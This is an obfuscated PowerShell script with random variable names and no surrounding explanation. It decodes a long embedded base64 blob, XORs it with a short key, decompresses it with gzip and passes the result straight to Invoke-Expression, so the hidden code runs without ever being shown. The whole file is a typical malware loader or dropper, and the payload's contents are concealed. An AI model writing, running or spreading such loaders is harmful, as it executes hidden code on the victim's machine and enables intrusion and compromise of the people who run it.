$r3ldpuxqh = [System.Text.Encoding]::ascii
function y20om7g1valf  {param($qsw7zmb50 )
  $6mk2w50i1 = [System.Convert]::FromBase64String($qsw7zmb50)
  $m2cdi4zsp= $r3ldpuxqh.GetBytes("mzg7l")
    $ctjh8vayo = $6mk2w50i1
    $9ae0gp156 = $(for ($vj5gx4n8o = 0; $vj5gx4n8o -lt $ctjh8vayo.length; ) {
        for ($6y0zqiogl = 0; $6y0zqiogl -lt $m2cdi4zsp.length; $6y0zqiogl++) {
            $ctjh8vayo[$vj5gx4n8o] -bxor $m2cdi4zsp[$6y0zqiogl]
            $vj5gx4n8o++
            if ($vj5gx4n8o -ge $ctjh8vayo.Length) {
                $6y0zqiogl = $m2cdi4zsp.length
            }
        }
    })
	$eroz4c8il = New-Object System.IO.MemoryStream( , $9ae0gp156 )

	    $e0824miyn = New-Object System.IO.MemoryStream
        $b6y09m5l3 = New-Object System.IO.Compression.GzipStream $eroz4c8il, ([IO.Compression.CompressionMode]::Decompress)
	    $b6y09m5l3.CopyTo( $e0824miyn )
        $b6y09m5l3.Close()
		$eroz4c8il.Close()
		[byte[]] $sma4wu612 = $e0824miyn.ToArray()
 $sl4vi182k=$sma4wu612
    return $sl4vi182k
}
[System.Text.Encoding]::ascii.GetString((y20om7g1valf "cvFvN2xtemczbOAuCljPK2qZa0iTue9labp9Qg6rJGmCtI//vrCRGX6NWeN78KwfOneuVNCbMyWQmOmNuEIykuzpovquC/MDAUEZIL0Qho7TGOW0ZK9W/8JsMw9qxyXlXtZSmo6frtG4CL149+DEcKKLP7e38zPHXVoXMr+qVjIDGksOzCvjlhipT5wZCyZl81yd8Z2HIauzBZQBP+T3hIkDFD/abdFlMvcTeYSSG3v+o984efBTOu2aXh1jfhrWvVhEleAtsnJaKKPgSMiHOdLeqpczMoEHIMGY8q6JUv6olhEM9jlNNsmH+nM4/+EuJdYTyhB3FhzLUOoPSJbZ21my/YYp7mAd0Ol007NEXID+zJ7g80edXJuRZZSGJPnXgBvWfQ+wGSONO6ms8xdWYmFYpyQL0WQVBY2xLjG24DoYewpgmza7iggApxzQ/Rc+tsbAAtLWGUCpNU+8GpGyQVJCJLi7kWA+2OjbNrnY5xlPFitGMhPmGZfSA9iyaCHgICSCG0YJ7IdLL2umCNAoMaq7iPhxhfhi2doa5sh4a5jAOJujHYdoFz2We3ZzYJsqy4/uHrqKKIwYkOBzUvQlECpEKUpwPj1MJn4RiYZx9RMfz7LwBdHMEZZFot274uQb6MV4BqZ4XVaKVrf+RWIrsFngWYX81C4t51jPfj1kaKajjHMSg7Z+vo5YU1Vmnm4/QurDm9uHqKW3fL7tG/TvJNwhJXHmyrrVQff15TAfE5Hlv4ZeOSV5i0ais7LGOtxS6Q9yN7wasBrokZKCxXpPgZSdSJFdlI5RpGhtASU+YKiVYOEQb3ETjdd3EP7LU5H61QxrKjznHNMM5Fu7xT6FLGrmcljHSYuyc5CvXpKi/PQvdctsOI8hMG2NAd16PGnhLwgIBiAwVlRS23nnet7Oc6zVna8B7uXiXd7NdLuQ62bifXcXlYfWoJ/z+kqNUNm1lTUQ1VFhFIgxEp+Rx9CxYKa8VowglPjInurhnOaB7u0bPSvyq1nESrOKie2f6ruVWxCAtevRsrhPKQCaZfPrkiSdmKutMg0ki/KDpXlenSlBgrCRWyCBuKepflvyqiSM2fvIh9hB/yUPK4vF/EHBRjag6wvDhaui5roYNrnnckT3am16"))|iex;